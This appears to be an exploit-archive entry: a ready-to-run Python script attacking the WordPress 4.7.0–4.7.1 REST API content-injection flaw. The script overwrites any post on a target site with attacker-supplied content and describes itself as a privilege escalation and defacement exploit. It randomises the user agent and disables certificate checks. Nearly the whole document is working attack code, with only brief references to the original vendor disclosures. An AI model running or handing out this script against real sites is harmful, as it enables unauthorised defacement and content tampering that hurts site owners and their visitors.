@@ -1,0 +1,52 @@
+id: 26876
+date: 02/02/2017
+title: WordPress 4.7.0 / 4.7.1 REST API Privilege Escalation Exploit
+author: Dustin Warren
+cves: 
+
+#!/usr/bin/env python
+'''
+    WordPress 4.7.0-4.7.1 REST API Post privilege escalation / defacement exploit
+
+    @dustyfresh
+    Date: 02-01-2017
+
+    Original vuln disclosed by Sucuri's research team
+
+    Reference:
+        https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
+        https://wpvulndb.com/vulnerabilities/8734
+        https://blogs.akamai.com/2017/02/wordpress-web-api-vulnerability.html
+        https://blog.cloudflare.com/protecting-everyone-from-wordpress-content-injection/
+'''
+import requests
+from fake_useragent import UserAgent
+import argparse
+import urllib.parse
+import random
+import string
+
+def attack(target, postID, payload):
+    ua = { 'user-agent': UserAgent().random }
+    uwotm8 = ''.join([random.choice(string.ascii_letters) for n in range(8)])
+    sploit_api = 'http://{}/index.php?rest_route=/wp/v2/posts/{}&id={}{}&content={}'.format(target, postID, postID, uwotm8, payload)
+    attack = requests.post(sploit_api, data = {}, headers=ua, verify=False)
+    if attack.status_code == 200:
+        print('Payload sent to {} with 200 status'.format(target))
+    else:
+        print('Payload sent to {}, but we are not sure if the attack was successful as {} was the response'.format(target, attack.status_code))
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='WordPress 4.7.0-4.7.1 REST API Post privilege escalation / defacement exploit')
+    parser.add_argument('--target', '-t', type=str, required=True, help='Post ID in which the payload will be applied')
+    parser.add_argument('--postID', '-pid', type=str, required=True, help='Post ID in which the payload will be applied')
+    parser.add_argument('--payload', '-p', type=str, required=True, help='What you would like to replace the post with')
+
+    args = parser.parse_args()
+    target = args.target
+    postID = args.postID
+    payload = urllib.parse.quote_plus(args.payload)
+    attack(target, postID, payload)
+
+#  0day.today [2023-03-25]  #
